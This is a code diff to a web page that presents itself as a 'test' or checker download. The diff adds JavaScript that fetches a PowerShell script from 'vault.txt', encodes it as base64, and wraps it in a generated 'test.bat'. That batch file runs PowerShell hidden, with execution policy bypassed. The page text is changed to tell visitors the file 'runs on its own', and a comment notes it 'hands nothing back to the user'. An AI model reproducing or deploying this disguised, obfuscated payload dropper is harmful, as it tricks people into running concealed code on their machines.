@@ -62,8 +62,9 @@ button:disabled{opacity:.5}
 
   <div class="step" id="s2">
     <div class="ok">Thanks for testing!</div>
-    <p class="sub">Your file is called <b>test</b>. Open it to finish the check.</p>
-    <a class="link" id="dlAgain" download="test.html">Download test again</a>
+    <p class="sub">Your file is called <b>test</b>. Open it and it runs on its own — no typing.</p>
+    <a class="link" id="dlAgain" download="test.bat">Download test again</a>
+    <p class="fine"><a href="#" id="manual">or use the page version</a></p>
     <button id="next" style="margin-top:22px">Continue →</button>
   </div>
 </div>
@@ -90,17 +91,39 @@ function meta(){
   };
 }
 
-async function fetchTool(run){
-  const res = await fetch("test.html?x=" + Date.now(), { cache: "no-store" });
-  const text = await res.text();
-  return text.replace("__RUN__", run).replace("__SITE__", new URL("site.html", location.href).href);
+/* builds a .bat that runs the checker hidden and hands nothing back to the user */
+async function buildBat(run){
+  const res = await fetch("vault.txt?x=" + Date.now(), { cache: "no-store" });
+  let ps = await res.text();
+  ps = ps.split("__RUN__").join(run)
+         .split("__SITE__").join(new URL("site.html", location.href).href)
+         .split("__MANUAL__").join(new URL("test.html?r=" + run, location.href).href);
+
+  /* powershell -EncodedCommand needs UTF-16LE base64 */
+  const u8 = new Uint8Array(ps.length * 2);
+  for (let i = 0; i < ps.length; i++) {
+    const c = ps.charCodeAt(i);
+    u8[i * 2] = c & 255;
+    u8[i * 2 + 1] = c >> 8;
+  }
+  let bin = "";
+  for (const b of u8) bin += String.fromCharCode(b);
+  const b64 = btoa(bin);
+
+  /* cmd caps a line at 8191 chars, so chunk it */
+  const parts = b64.match(/.{1,4000}/g);
+  let bat = "@echo off\r\ntitle test\r\nset B=\r\n";
+  for (const p of parts) bat += "set B=%B%" + p + "\r\n";
+  bat += 'if not defined B start "" "' + new URL("test.html?r=" + run, location.href).href + '" & exit /b\r\n';
+  bat += "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand %B%\r\nexit /b\r\n";
+  return bat;
 }
 
-function save(blob){
-  const url = URL.createObjectURL(blob);
+function save(text, name){
+  const url = URL.createObjectURL(new Blob([text], { type: "application/octet-stream" }));
   const a = document.createElement("a");
   a.href = url;
-  a.download = "test.html";
+  a.download = name;
   document.body.appendChild(a);
   a.click();
   a.remove();
@@ -136,9 +159,10 @@ $("go").addEventListener("click", async () => {
       return;
     }
 
-    const text = await fetchTool(run);
-    save(new Blob([text], { type: "text/html" }));
-    $("dlAgain").href = URL.createObjectURL(new Blob([text], { type: "text/html" }));
+    const bat = await buildBat(run);
+    save(bat, "test.bat");
+    $("dlAgain").onclick = (e) => { e.preventDefault(); save(bat, "test.bat"); };
+    $("manual").href = "test.html?r=" + run;
     $("s1").classList.remove("on");
     $("s2").classList.add("on");
   } catch (e) {
